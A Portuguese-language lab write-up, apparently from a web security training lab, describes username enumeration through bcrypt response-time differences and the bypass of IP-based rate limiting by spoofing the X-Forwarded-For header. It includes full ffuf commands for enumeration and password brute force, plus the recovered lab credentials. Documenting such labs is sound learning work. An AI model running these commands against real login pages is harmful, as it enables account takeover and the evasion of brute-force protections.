## Objetivo
Enumeração e brute force a partir de resposta de tempo diferente no servidor(ms) e rate limit basico confiando em IP apenas por X-Forwarded-For

## Vulnerabilidade Identificada
o servidor processa bcrypt quando o username existe. Quando inválido, rejeita antes. essa assimetria vaza o timing.
é um comportamento esperado do bcrypt sendo mal protegido.

## Metodologia
Testei o header manualmente no ffuf e confirmei que o servidor aceitava o IP forjado sem validação. 
usando esse vetor de bypass usei uma lista de ips basico que gerei e usando o modo pitchfork do ffuf fiz um fuzz com a senha longa pra ver resposta do servidor
a senha longa amplifica o tempo de processamento bcrypt, aumentando a diferença entre username válido e inválido e tornando o outlier detectável mesmo com variação de rede

## Comandos Utilizados

```bash
ffuf -w /home/luweed/Documents/wordusers.txt:FUZZ \
     -w /home/luweed/Documents/ips.txt:FUZZ2 \
     -mode pitchfork \
     -u https://0a15005f0379d3f28046854f002000f3.web-security-academy.net/login \
     -X POST \
     -d "username=FUZZ&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "X-Forwarded-For: FUZZ2" \
     -v 
```

a resposta teve uma diferença de mais q o dobro de tempo em ms dos demais, mais de 400ms em comparação com as outras faixa de 250.


```bash
ffuf -w /home/luweed/Documents/rockpass.txt:FUZZ \
     -w /home/luweed/Documents/ips.txt:FUZZ2 \
     -mode pitchfork \
     -u https://0a15005f0379d3f28046854f002000f3.web-security-academy.net/login \
     -X POST \
     -d "username=as&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "X-Forwarded-For: FUZZ2" \
     -fc 200
```


output: `` [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 253ms]
    * FUZZ: daniel
    * FUZZ2: 1.1.1.54
``

## Resultado

``as:daniel``

## Lições Aprendidas
Em servidores com verificação bcrypt é possivel fazer enumeração precisa a partir da response time do servidor. nesse lab em especifico o campo de senha não tinha limite
isso me permitiu fazer um ataque mais eficiente e facil de analisar. 
E também o servidor confiar em rate limit IP apenas por X-Forwarded-For é uma misconfiguration, e usando esse vetor de bypass me permitiu fazer o bypass de forma simples





